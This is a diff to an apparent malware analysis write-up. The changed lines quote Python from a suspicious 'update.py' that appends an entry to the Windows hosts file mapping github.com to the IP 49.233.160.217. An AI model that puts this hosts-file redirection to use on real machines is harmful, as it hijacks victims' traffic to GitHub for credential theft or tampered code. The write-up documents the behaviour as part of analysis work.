@@ -29,7 +29,7 @@ The MD5 hash lookup on VirusTotal appeared clean and did not provide a clear mal
 Reviewing `update.py` revealed that it appends this mapping to the Windows hosts file:
 
 ```python
-f = open("C:\\Windows\\System32\\drivers\\etc\\hosts", "a")
+f = open("C:\Windows\System32\drivers\etc\hosts", "a")
 f.write("49.233.160.217 github.com")
 ```
 
